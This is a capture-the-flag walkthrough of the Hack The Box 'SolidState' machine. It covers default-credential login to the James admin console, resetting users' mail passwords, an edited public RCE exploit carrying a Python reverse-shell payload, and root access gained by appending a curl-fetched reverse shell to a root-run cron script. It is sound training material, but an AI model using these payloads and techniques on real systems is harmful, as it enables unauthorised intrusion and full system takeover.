---
title: Hack The Box - SolidState (Without Metasploit)
date: 2021-01-15 00:05:00 +0800
categories: [hackthebox]
tags: [linux, james]
---

![](/assets/images/solidstate.png){:height="414px" width="615px"}

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.51 solidstate.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

```bash 
$ rustscan --accessible -a solidstate.htb -r 1-65535 -- -sT -sV -sC -Pn
File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.10.51:25
Open 10.10.10.51:22
Open 10.10.10.51:80
Open 10.10.10.51:110
Open 10.10.10.51:119
Open 10.10.10.51:4555
Starting Script(s)
Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-14 13:49 UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:49
Completed NSE at 13:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:49
Completed NSE at 13:49, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:49
Completed NSE at 13:49, 0.00s elapsed
Initiating Connect Scan at 13:49
Scanning solidstate.htb (10.10.10.51) [6 ports]
Discovered open port 22/tcp on 10.10.10.51
Discovered open port 110/tcp on 10.10.10.51
Discovered open port 25/tcp on 10.10.10.51
Discovered open port 80/tcp on 10.10.10.51
Discovered open port 119/tcp on 10.10.10.51
Discovered open port 4555/tcp on 10.10.10.51
Completed Connect Scan at 13:49, 0.01s elapsed (6 total ports)
Initiating Service scan at 13:49
Scanning 6 services on solidstate.htb (10.10.10.51)
Completed Service scan at 13:49, 11.03s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.10.51.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:49
Completed NSE at 13:50, 11.09s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:50
Completed NSE at 13:50, 0.07s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:50
Completed NSE at 13:50, 0.00s elapsed
Nmap scan report for solidstate.htb (10.10.10.51)
Host is up, received user-set (0.0068s latency).
Scanned at 2021-01-14 13:49:40 UTC for 22s

PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp5WdwlckuF4slNUO29xOk/Yl/cnXT/p6qwezI0ye+4iRSyor8lhyAEku/yz8KJXtA+ALhL7HwYbD3hDUxDkFw90V1Omdedbk7SxUVBPK2CiDpvXq1+r5fVw26WpTCdawGKkaOMYoSWvliBsbwMLJEUwVbZ/GZ1SUEswpYkyZeiSC1qk72L6CiZ9/5za4MTZw8Cq0akT7G+mX7Qgc+5eOEGcqZt3cBtWzKjHyOZJAEUtwXAHly29KtrPUddXEIF0qJUxKXArEDvsp7OkuQ0fktXXkZuyN/GRFeu3im7uQVuDgiXFKbEfmoQAsvLrR8YiKFUG6QBdI9awwmTkLFbS1Z
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBISyhm1hXZNQl3cslogs5LKqgWEozfjs3S3aPy4k3riFb6UYu6Q1QsxIEOGBSPAWEkevVz1msTrRRyvHPiUQ+eE=
|   256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMKbFbK3MJqjMh9oEw/2OVe0isA7e3ruHz5fhUP4cVgY
25/tcp   open  smtp        syn-ack JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello solidstate.htb (10.10.XX.XX [10.10.XX.XX]), 
80/tcp   open  http        syn-ack Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        syn-ack JAMES pop3d 2.3.2
119/tcp  open  nntp        syn-ack JAMES nntpd (posting ok)
4555/tcp open  james-admin syn-ack JAMES Remote Admin 2.3.2
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:50
Completed NSE at 13:50, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:50
Completed NSE at 13:50, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:50
Completed NSE at 13:50, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.67 seconds
```

# Enumeration (1)

## Port 80 `Apache httpd 2.4.25 ((Debian))`

![](/assets/images/solidstate1.png)

It seems that this website belongs to a company called "Solid State Security". Unfortunately, there is actually nothing of importance here.

## Port 4555 `JAMES Remote Admin 2.3.2`

```bash
$ nc -v solidstate.htb 4555   
solidstate.htb [10.10.10.51] 4555 (?) open
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
```

We are instantly prompted for credentials According to online, the default credentials was `root:root`. With it, we are able to successfully login!

```bash
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
```

If we use the `listusers` features, we see that there are 5 users on this service.

```bash
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

As `root` on the service, we are able to change the passwords of users.

```bash
setpassword james password
Password for james reset
setpassword thomas password
Password for thomas reset
setpassword john password
Password for john reset
setpassword mindy password
Password for mindy reset
setpassword mailadmin password
Password for mailadmin reset
```

## Port 110 `JAMES pop3d 2.3.2`

```bash
$ telnet solidstate.htb 110 
Trying 10.10.10.51...
Connected to solidstate.htb.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
```

Using the usernames we found and the passwords we set for them, we can login and check out each of their mails.

Upon logging in as `john`, we see that there is a mail talking about sending `mindy` her temporary password.

```bash
USER john
+OK
PASS password
+OK Welcome john
list
+OK 1 743
1 743
.
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James
```

If we login as `mindy`, we see 2 mails, one of which containing `SSH` credentials!

```bash
USER mindy
+OK
PASS password
+OK Welcome mindy
list
+OK 2 1945
1 1109
2 836
.
retr 1 
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
retr 2 \
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
```

## Port 22 `OpenSSH 7.4p1`

Now, we can login using the credentials `mindy:P@55W0rd1!2@`.

```bash
$ ssh mindy@solidstate.htb
mindy@solidstate:~$ id
-rbash: id: command not found
```

However, we realise we are in a `rbash` shell and we can only `cat`, `env` and `ls`.

# user.txt

The user flag is in `mindy`'s home directory.

```bash
mindy@solidstate:~$ cat user.txt
0510XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

# Enumeration (2)

As I was unable to breakout of `rbash` with the current commands I have, I decided to look for alternatives. Using `searchsploit`, I found exploits relating to the version of `James` running on the machine.

```bash
$ searchsploit james 2.3.2
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
Apache James Server 2.3.2 - Insecure User Creation Arbitrary File W | linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Execution                | linux/remote/35513.py
-------------------------------------------------------------------- ---------------------------------
```

# Exploitation (1)

After copying the script for the exploit `Apache James Server 2.3.2 - Remote Command Execution`, I modified the payload that is to be executed such that a reverse shell will be executed.

```bash
$ cat 35513.py 
...
payload = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.XX.XX",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''
...
```

Now, we start our `nc` listener

```bash
$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
```

And run the exploit.

```bash
$ python 35513.py solidstate.htb   
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in.
```

Now if we login as `mindy` again:

```bash
$ ssh mindy@solidstate.htb
```

We will receive a reverse shell connection on our listener as `mindy`. However, our shell is no longer restricted!

```bash
$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.51] 43388
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
```

# Enumeration (2)

Without much enumeration, I found some interesting files in `/opt`.

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls -al /opt
total 16
drwxr-xr-x  3 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 Jun 18  2017 ..
drwxr-xr-x 11 root root 4096 Aug 22  2017 james-2.3.2
-rwxrwxrwx  1 root root  318 Jan 14 09:26 tmp.py
```

A file called `tmp.py` is owned by `root` and we can write to it! Lets check the contents.

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat /opt/tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

It just recursively deletes files in `/tmp`. Lets monitor using `pspy` to see whether this file is indeed being executed by `root`!

After tranferring `pspy` over, we can start monitoring for new processes.

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ./pspy32
...
2021/01/14 09:24:01 CMD: UID=0    PID=1743   | /usr/sbin/CRON -f 
2021/01/14 09:24:01 CMD: UID=0    PID=1744   | /usr/sbin/CRON -f 
2021/01/14 09:24:01 CMD: UID=0    PID=1745   | /bin/sh -c python /opt/tmp.py 
2021/01/14 09:24:01 CMD: UID=0    PID=1746   | python /opt/tmp.py 
2021/01/14 09:24:01 CMD: UID=0    PID=1747   | sh -c rm -r /tmp/*
```

We can now confirm that `tmp.py` is being executed by `root`!

# Exploitation (2)

All we have to do is just append a `python` reverse shell to `tmp.py`

```bash
$ curl http://10.10.XX.XX/payload >> /opt/tmp.py
$ cat /opt/tmp.py
...
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.XX.XX",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

We then setup our `nc` listener again and we will eventually receive reverse shell as `root`.
```bash
$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.51] 55858
root@solidstate:~# id
uid=0(root) gid=0(root) groups=0(root)
```

# root.txt

The root flag is located in the home directory of `root`, as usual.

```bash
root@solidstate:~# cat /root/root.txt
4f4aXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

### Rooted ! Thank you for reading and look forward for more writeups and articles !